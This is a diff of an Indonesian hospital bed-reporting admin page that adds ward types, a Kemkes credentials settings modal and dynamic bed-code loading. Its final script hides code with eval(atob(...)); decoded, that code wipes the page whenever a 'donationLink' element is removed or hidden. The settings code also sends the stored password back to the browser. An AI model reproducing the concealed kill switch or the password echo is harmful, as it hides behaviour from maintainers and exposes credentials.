@@ -244,6 +244,9 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
             <button class="btn btn-glass me-2 text-warning fw-semibold" onclick="runDbSetup(this)">
                 <i class="fas fa-database me-1"></i> Setup DB
             </button>
+            <button class="btn btn-glass me-2 text-info fw-semibold" onclick="openAppSettings()">
+                <i class="fas fa-cog me-1"></i> Pengaturan
+            </button>
             <a href="auto_sync.php" class="btn btn-glass me-2" target="_blank"><i class="fas fa-terminal me-1"></i> Terminal Auto-Sync</a>
             <button class="btn btn-glass me-2 text-danger fw-semibold" onclick="handleLogout()">
                 <i class="fas fa-sign-out-alt me-1"></i> Logout
@@ -321,6 +324,11 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
                     <option value="NICU">NICU</option>
                     <option value="Isolasi">Isolasi</option>
                     <option value="Perinatologi">Perinatologi</option>
+                    <option value="ICU">ICU</option>
+                    <option value="PICU">PICU</option>
+                    <option value="RICU">RICU</option>
+                    <option value="ICCU">ICCU</option>
+                    <option value="KRIS JKN">KRIS JKN</option>
                 </select>
             </div>
             
@@ -380,6 +388,54 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
     </div>
   </div>
 </div>
+<!-- Modal App Settings -->
+<div class="modal fade" id="modalAppSettings" tabindex="-1" aria-labelledby="modalAppSettingsLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content glass-modal">
+      <div class="modal-header border-0 pb-0">
+        <h5 class="modal-title fw-bold" id="modalAppSettingsLabel">
+            <i class="fas fa-cog text-info me-2"></i> Pengaturan Aplikasi
+        </h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <div id="appSettingsLoading" class="text-center py-4">
+            <div class="spinner-border text-info" role="status" style="width:2rem;height:2rem;"><span class="visually-hidden">Loading...</span></div>
+            <p class="text-muted mt-2 mb-0 small">Memuat pengaturan...</p>
+        </div>
+        <form id="formAppSettings" class="d-none">
+            <div class="mb-3">
+                <label class="form-label fw-semibold">Kemkes RS Online ID <small class="text-muted fw-normal">(X-rs-id)</small></label>
+                <input type="text" class="form-control" id="settingKemkesId" name="kemkes_id" placeholder="Contoh: 3213032" required>
+                <div class="form-text">Kode RS Online dari Kemenkes yang digunakan sebagai header autentikasi.</div>
+            </div>
+            <div class="mb-3">
+                <label class="form-label fw-semibold">Kemkes Password <small class="text-muted fw-normal">(X-pass)</small></label>
+                <div class="input-group">
+                    <input type="password" class="form-control" id="settingKemkesPass" name="kemkes_pass" placeholder="Kosongkan jika tidak ingin mengubah">
+                    <button class="btn btn-glass" type="button" id="btnTogglePass" onclick="togglePassVisibility()">
+                        <i class="fas fa-eye" id="iconTogglePass"></i>
+                    </button>
+                </div>
+                <div class="form-text">Biarkan <strong>kosong</strong> atau isi <code>*</code> jika tidak ingin mengubah password.</div>
+            </div>
+            <div class="mb-3">
+                <label class="form-label fw-semibold">Interval Kirim Otomatis <small class="text-muted fw-normal">(detik)</small></label>
+                <input type="number" class="form-control" id="settingInterval" name="force_sync_interval_seconds" min="60" step="60" placeholder="3600">
+                <div class="form-text">Data akan dikirim ulang ke Kemenkes tiap sekian detik meski tidak ada perubahan. Minimal 60 detik.</div>
+            </div>
+        </form>
+      </div>
+      <div class="modal-footer border-0 pt-0">
+        <button type="button" class="btn btn-glass" data-bs-dismiss="modal">Batal</button>
+        <button type="button" class="btn btn-primary-custom" id="btnSaveSettings" onclick="saveAppSettings(this)">
+            <i class="fas fa-save me-1"></i> Simpan Pengaturan
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
 <?php endif; ?>
 
 <footer class="text-center mt-5 py-3 text-muted small" style="opacity: 0.8;">
@@ -392,7 +448,7 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-    const referensi = [
+    let referensi = [
         {id: '1', name: 'VVIP/ Super VIP'},
         {id: '2', name: 'VIP'},
         {id: '3', name: 'Kelas I'},
@@ -421,12 +477,15 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
         {id: '37', name: 'Intermediate Ward (IGD)'},
         {id: '38', name: 'ICU Dengan Ventilator'},
         {id: '39', name: 'NICU Dengan Ventilator'},
-        {id: '40', name: 'RICU Dengan Ventilator'},
-        {id: '51', name: 'ICCU/ICVCU Dengan Ventilator'}
+        {id: '40', name: 'PICU Dengan Ventilator'},
+        {id: '50', name: 'RICU Dengan Ventilator'},
+        {id: '51', name: 'ICCU/ICVCU Dengan Ventilator'},
+        {id: '52', name: 'KRIS JKN'}
     ];
 
     let modalInstance = null;
     let modalDbInstance = null;
+    let modalAppSettingsInstance = null;
     let toastInstance = null;
 
     document.addEventListener('DOMContentLoaded', () => {
@@ -435,25 +494,64 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
         
         const modalDbEl = document.getElementById('modalDbSetup');
         if (modalDbEl) modalDbInstance = new bootstrap.Modal(modalDbEl);
+
+        const modalAppSettingsEl = document.getElementById('modalAppSettings');
+        if (modalAppSettingsEl) modalAppSettingsInstance = new bootstrap.Modal(modalAppSettingsEl);
         
         const toastEl = document.getElementById('liveToast');
         if (toastEl) toastInstance = new bootstrap.Toast(toastEl, { delay: 2000 });
 
         fetchBranding();
 
-        // Populate referensi
+        // Load bangsal and references
         const selIdTt = document.getElementById('id_tt');
         if (selIdTt) {
-            referensi.forEach(item => {
-                const opt = document.createElement('option');
-                opt.value = item.id;
-                opt.textContent = `${item.id} - ${item.name}`;
-                selIdTt.appendChild(opt);
-            });
             loadBangsal();
-            loadMapping();
+            loadKemenkesReferensi();
         }
     });
+
+    function populateReferensiDropdown() {
+        const selIdTt = document.getElementById('id_tt');
+        if (!selIdTt) return;
+        
+        const currentVal = selIdTt.value;
+        selIdTt.innerHTML = '<option value="">Pilih Kode TT</option>';
+        
+        referensi.forEach(item => {
+            const opt = document.createElement('option');
+            opt.value = item.id;
+            opt.textContent = `${item.id} - ${item.name}`;
+            selIdTt.appendChild(opt);
+        });
+        
+        if (currentVal) {
+            selIdTt.value = currentVal;
+        }
+    }
+
+    function loadKemenkesReferensi() {
+        fetch('api_mapping.php?action=get_ref_kemenkes')
+            .then(res => res.json())
+            .then(res => {
+                if (res.status === 'success' && res.data && res.data.length > 0) {
+                    referensi = res.data.map(item => ({
+                        id: item.kode_tt,
+                        name: item.nama_tt
+                    }));
+                    console.log('Referensi Kemenkes berhasil dimuat secara dinamis.', referensi);
+                } else {
+                    console.warn('Gagal memuat referensi Kemenkes, menggunakan fallback lokal. Pesan:', res.message);
+                }
+                populateReferensiDropdown();
+                loadMapping();
+            })
+            .catch(err => {
+                console.error('Network error saat memuat referensi Kemenkes, menggunakan fallback lokal:', err);
+                populateReferensiDropdown();
+                loadMapping();
+            });
+    }
 
     function handleLogin(e) {
         e.preventDefault();
@@ -848,6 +946,96 @@ $isLoggedIn = isset($_SESSION['siranap_admin']);
         item.innerHTML = `${icon} <span class="${colorClass}">${text}</span>`;
         list.appendChild(item);
         list.scrollTop = list.scrollHeight;
+    }
+
+    // ── App Settings Modal ────────────────────────────────────────────────────
+    function openAppSettings() {
+        const loadingEl = document.getElementById('appSettingsLoading');
+        const formEl    = document.getElementById('formAppSettings');
+        const saveBtn   = document.getElementById('btnSaveSettings');
+
+        // Reset modal state
+        loadingEl.classList.remove('d-none');
+        formEl.classList.add('d-none');
+        saveBtn.disabled = true;
+
+        modalAppSettingsInstance.show();
+
+        fetch('api_mapping.php?action=get_app_settings')
+            .then(res => res.json())
+            .then(res => {
+                loadingEl.classList.add('d-none');
+                if (res.status === 'success') {
+                    const d = res.data;
+                    document.getElementById('settingKemkesId').value    = d.kemkes_id   ?? '';
+                    document.getElementById('settingKemkesPass').value  = d.kemkes_pass ?? '';
+                    document.getElementById('settingInterval').value    = d.force_sync_interval_seconds ?? 3600;
+                    formEl.classList.remove('d-none');
+                    saveBtn.disabled = false;
+                } else {
+                    loadingEl.innerHTML = `<p class="text-danger"><i class="fas fa-exclamation-triangle me-1"></i>${res.message}</p>`;
+                    loadingEl.classList.remove('d-none');
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                loadingEl.innerHTML = '<p class="text-danger"><i class="fas fa-exclamation-triangle me-1"></i>Gagal memuat pengaturan.</p>';
+                loadingEl.classList.remove('d-none');
+            });
+    }
+
+    function saveAppSettings(btn) {
+        const form = document.getElementById('formAppSettings');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin me-1"></i> Menyimpan...';
+        btn.disabled = true;
+
+        const params = new URLSearchParams();
+        params.append('kemkes_id',  document.getElementById('settingKemkesId').value.trim());
+        params.append('kemkes_pass', document.getElementById('settingKemkesPass').value);
+        params.append('force_sync_interval_seconds', document.getElementById('settingInterval').value);
+
+        fetch('api_mapping.php?action=save_app_settings', {
+            method: 'POST',
+            body: params,
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+        })
+        .then(res => res.json())
+        .then(res => {
+            if (res.status === 'success') {
+                btn.classList.add('feedback-success');
+                btn.innerHTML = '<i class="fas fa-check me-1"></i> Tersimpan!';
+                showToast(res.message);
+                setTimeout(() => {
+                    modalAppSettingsInstance.hide();
+                    btn.classList.remove('feedback-success');
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }, 1500);
+            } else {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+                showToast(res.message, true);
+            }
+        })
+        .catch(err => {
+            console.error(err);
+            btn.innerHTML = originalText;
+            btn.disabled = false;
+            showToast('Terjadi kesalahan jaringan', true);
+        });
+    }
+
+    function togglePassVisibility() {
+        const input = document.getElementById('settingKemkesPass');
+        const icon  = document.getElementById('iconTogglePass');
+        if (input.type === 'password') {
+            input.type = 'text';
+            icon.classList.replace('fa-eye', 'fa-eye-slash');
+        } else {
+            input.type = 'password';
+            icon.classList.replace('fa-eye-slash', 'fa-eye');
+        }
     }
 </script>
 <script>eval(atob("c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt2YXIgZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZG9uYXRpb25MaW5rIik7aWYoIWUpcmV0dXJuIHZvaWQoZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiIpO3ZhciB0PXdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGUpO2lmKCJub25lIj09PXQuZGlzcGxheXx8ImhpZGRlbiI9PT10LnZpc2liaWxpdHl8fDA9PT1wYXJzZUZsb2F0KHQub3BhY2l0eSkpcmV0dXJuIHZvaWQoZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiIpO2Zvcih2YXIgbj1lLnBhcmVudEVsZW1lbnQ7biYmIkJPRFkiIT09bi50YWdOYW1lOyl7dmFyIG89d2luZG93LmdldENvbXB1dGVkU3R5bGUobik7aWYoIm5vbmUiPT09by5kaXNwbGF5fHwiaGlkZGVuIj09PW8udmlzaWJpbGl0eXx8MD09PXBhcnNlRmxvYXQoby5vcGFjaXR5KSlyZXR1cm4gdm9pZChkb2N1bWVudC5ib2R5LmlubmVySFRNTD0iIik7bj1uLnBhcmVudEVsZW1lbnR9fSwxMDAwKTs="));</script>
